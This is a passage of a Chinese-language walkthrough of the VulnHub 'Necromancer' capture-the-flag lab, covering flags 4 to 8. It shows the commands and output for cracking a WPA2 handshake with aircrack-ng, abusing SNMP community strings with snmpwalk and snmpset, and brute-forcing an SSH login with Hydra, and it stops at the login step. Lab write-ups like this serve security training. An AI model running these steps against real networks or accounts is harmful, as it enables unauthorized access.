+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+</span></span><span class=line><span class=cl>You fall to your knees.. weak and weary.
+</span></span><span class=line><span class=cl>Looking up you can see the spell is still protecting the cave entrance.
+</span></span><span class=line><span class=cl>The talisman is now almost too hot to touch!
+</span></span><span class=line><span class=cl>Turning it over you see words now etched into the surface:
+</span></span><span class=line><span class=cl>flag4<span class=o>{</span>ea50536158db50247e110a6c89fcf3d3<span class=o>}</span>
+</span></span><span class=line><span class=cl>Chant these words at u31337
+</span></span><span class=line><span class=cl>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag5>获取flag5</h2><p>得到的新提示是把 flag4 的内容发送到 UDP 31337 端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;ea50536158db50247e110a6c89fcf3d3&#34;</span> <span class=p>|</span> nc -u -w <span class=m>3</span> 10.10.10.102 <span class=m>31337</span>
+</span></span><span class=line><span class=cl>Chant had no affect! Try in a different tongue!
+</span></span></code></pre></td></tr></table></div></div><p>感觉这又是一个md5</p><p>反查为 blackmagic</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;blackmagic&#34;</span> <span class=p>|</span> nc -u -w <span class=m>3</span> 10.10.10.102 <span class=m>31337</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As you chant the words, a hissing sound echoes from the ice walls.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The blue aura disappears from the cave entrance.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You enter the cave and see that it is dimly lit by torches<span class=p>;</span> shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Suddenly, you are attacked by a swarm of bats!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You aimlessly thrash at the air in front of you!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The bats <span class=k>continue</span> their relentless attack, <span class=k>until</span>.... silence.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Looking towards one of the torches, you see something on the cave wall.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/thenecromancerwillabsorbyoursoul
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag5<span class=o>{</span>0766c36577af58e15545f099a3b15e60<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag6>获取flag6</h2><p>/thenecromancerwillabsorbyoursoul 这是得到的新路径</p><p>访问得到新的flag6同时又是一串文字和图片</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>|   |
+</span></span><span class=line><span class=cl>|---|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>The Door<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>body</span> <span class=na>bgcolor</span><span class=o>=</span><span class=s>&#34;#000000&#34;</span> <span class=na>link</span><span class=o>=</span><span class=s>&#34;green&#34;</span> <span class=na>vlink</span><span class=o>=</span><span class=s>&#34;green&#34;</span> <span class=na>alink</span><span class=o>=</span><span class=s>&#34;green&#34;</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>font</span> <span class=na>color</span><span class=o>=</span><span class=s>&#34;green&#34;</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|You continue to make your way through the cave.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|In the distance you can see a familiar flicker of light moving in and out of the shadows. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|You move closer, and then stop frozen with fear.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|It&#39;s the <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;[./necromancer](http://10.10.10.102/thenecromancerwillabsorbyoursoul/necromancer)&#34;</span><span class=p>&gt;</span>necromancer!<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;[../pics/necromancer.jpg](http://10.10.10.102/pics/necromancer.jpg)&#34;</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>font</span> <span class=na>size</span><span class=o>=</span><span class=s>2</span><span class=p>&gt;</span>Image copyright:<span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;[http://www.deviantart.com/art/The-Warlock-Necromancer-339634655](http://www.deviantart.com/art/The-Warlock-Necromancer-339634655)&#34;</span> <span class=na>target</span><span class=o>=</span><span class=s>_blank</span><span class=p>&gt;</span> Manzanedo<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|Again he stares at you with deathly hollow eyes. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|He is standing in a doorway; a staff in one hand, and an object in the other. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|Smirking, the necromancer holds the staff and the object in the air.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|He points his staff in your direction, and the stench of death and decay begins to fill the air.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|You stare into his eyes and then.......<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|The amulet must have saved you from whatever spell the necromancer had cast.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|You stand to your feet. Behind you, only darkness.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|Before you, a large door with the symbol of a skull engraved into the surface. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|Looking closer at the skull, you can see u161 engraved into the forehead.<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>|<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>|
+</span></span><span class=line><span class=cl>||
+</span></span></code></pre></td></tr></table></div></div><p>3条线索</p><ol><li>链接：./necromancer（完整路径是 /thenecromancerwillabsorbyoursoul/necromancer）</li></ol><p>点击这个链接提示我们要下载</p><ol start=2><li><p>图片：../pics/necromancer.jpg</p></li><li><p>文字提示：u161（UDP 161，对应 SNMP 服务）</p></li></ol><h2 id=获取flag7>获取flag7</h2><p>下载这个新文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ file necromancer 
+</span></span><span class=line><span class=cl>necromancer: bzip2 compressed data, block <span class=nv>size</span> <span class=o>=</span> 900k
+</span></span></code></pre></td></tr></table></div></div><p>bzip2格式先解压</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bzip2  -d necromancer
+</span></span></code></pre></td></tr></table></div></div><p>解出来的是 tar，再 tar xf</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>tar xf necromancer.out <span class=o>&amp;&amp;</span> ls -la necromancer.cap
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ file necromancer.cap
+</span></span><span class=line><span class=cl>necromancer.cap: pcap capture file, microsecond ts <span class=o>(</span>little-endian<span class=o>)</span> - version 2.4 <span class=o>(</span>802.11, capture length 65535<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=抓包分析抓到-wpa-握手>抓包分析：抓到 WPA 握手</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ capinfos necromancer.cap
+</span></span><span class=line><span class=cl>Number of packets:   2,197
+</span></span><span class=line><span class=cl>File encapsulation:  IEEE 802.11 Wireless LAN
+</span></span><span class=line><span class=cl>Capture duration:    11.360937 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ tshark -r necromancer.cap -q -z io,phs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>frame                                    frames:2197 bytes:45066
+</span></span><span class=line><span class=cl>  wlan                                   frames:2197 bytes:45066
+</span></span><span class=line><span class=cl>    llc                                  frames:5 bytes:789
+</span></span><span class=line><span class=cl>      eapol                              frames:5 bytes:789
+</span></span></code></pre></td></tr></table></div></div><p>协议栈里只有 wlan 加上 5 个 EAPOL，其余全是 Beacon/Probe 管理帧和 RTS/CTS/ACK 控制帧，说明抓到了一个 WPA/WPA2 四次握手。</p><p>看目标网络与握手细节：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ tshark -r necromancer.cap -Y <span class=s2>&#34;wlan.fc.type_subtype==8&#34;</span> -T fields -e wlan.bssid -e wlan.ssid
+</span></span><span class=line><span class=cl>c4:12:f5:0d:5e:95	community
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ tshark -r necromancer.cap -Y <span class=s2>&#34;eapol&#34;</span> -T fields -e wlan_rsna_eapol.keydes.msgnr
+</span></span><span class=line><span class=cl><span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=m>3</span>
+</span></span><span class=line><span class=cl><span class=m>4</span>
+</span></span></code></pre></td></tr></table></div></div><p>SSID 是 <code>community</code>，加密方式 WPA2-PSK（AES-CCM），msg1 里还带 PMKID，可以直接爆破口令。</p><h3 id=爆破-wpa-口令>爆破 WPA 口令</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ gunzip -c /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ aircrack-ng -w rockyou.txt necromancer.cap
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                               Aircrack-ng 1.7
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=o>[</span>00:00:06<span class=o>]</span> 44593/14344392 keys tested <span class=o>(</span>8053.39 k/s<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                           KEY FOUND! <span class=o>[</span> death2all <span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到 WiFi 口令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>death2all
+</span></span></code></pre></td></tr></table></div></div><h3 id=用口令作-snmp-community-打-161>用口令作 SNMP community 打 161</h3><p>flag6 给的线索是 u161（UDP 161 = SNMP），而这里爆出来的 wifi 口令正好就是 SNMP 的 community string：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ snmpwalk -v2c -c death2all 10.10.10.102 1.3.6.1.2.1.1
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.1.0 <span class=o>=</span> STRING: <span class=s2>&#34;You stand in front of a door.&#34;</span>
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.4.0 <span class=o>=</span> STRING: <span class=s2>&#34;The door is Locked. If you choose to defeat me, the door must be Unlocked.&#34;</span>
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.5.0 <span class=o>=</span> STRING: <span class=s2>&#34;Fear the Necromancer!&#34;</span>
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.6.0 <span class=o>=</span> STRING: <span class=s2>&#34;Locked - death2allrw!&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>sysLocation</code> 泄露了读写 community：<code>death2allrw</code>（death2all + rw）。</p><h3 id=用读写-community-解锁-door>用读写 community 解锁 door</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ snmpset -c death2allrw -v <span class=m>1</span> 10.10.10.102 iso.3.6.1.2.1.1.6.0 s Unlocked
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.6.0 <span class=o>=</span> STRING: <span class=s2>&#34;Unlocked&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=解锁后再读-system-组>解锁后再读 system 组：</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ snmpwalk -v2c -c death2allrw 10.10.10.102 1.3.6.1.2.1.1
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.4.0 <span class=o>=</span> STRING: <span class=s2>&#34;The door is unlocked! You may now enter the Necromancer&#39;s lair!&#34;</span>
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.5.0 <span class=o>=</span> STRING: <span class=s2>&#34;Fear the Necromancer!&#34;</span>
+</span></span><span class=line><span class=cl>iso.3.6.1.2.1.1.6.0 <span class=o>=</span> STRING: <span class=s2>&#34;flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag8>获取flag8</h2><p>-t22可能是提示22端口开放了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>10000</span> -p- 10.10.10.102 
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-10-06 16:45 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00078s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65534</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:27:05:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 13.93 seconds
+</span></span></code></pre></td></tr></table></div></div><p>没错是开放的</p><p>flag7里面的字符依旧符合md5特征</p><p>反查得到 demonslayer 像个用户名</p><p>这里我们爆破一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ hydra -l demonslayer -P /tmp/rockyou.txt -t <span class=m>4</span> -f ssh://10.10.10.102
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra v9.7 <span class=o>(</span>c<span class=o>)</span> <span class=m>2023</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2026-10-06 16:49:00
+</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>4</span> tasks per <span class=m>1</span> server, overall <span class=m>4</span> tasks, <span class=m>14344399</span> login tries <span class=o>(</span>l:1/p:14344399<span class=o>)</span>, ~3586100 tries per task
+</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.10.10.102:22/
+</span></span><span class=line><span class=cl><span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.10.10.102   login: demonslayer   password: <span class=m>12345678</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> attack finished <span class=k>for</span> 10.10.10.102 <span class=o>(</span>valid pair found<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
+</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2026-10-06 16:49:02
+</span></span></code></pre></td></tr></table></div></div><p>得到密码12345678</p><h3 id=ssh登陆>ssh登陆</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
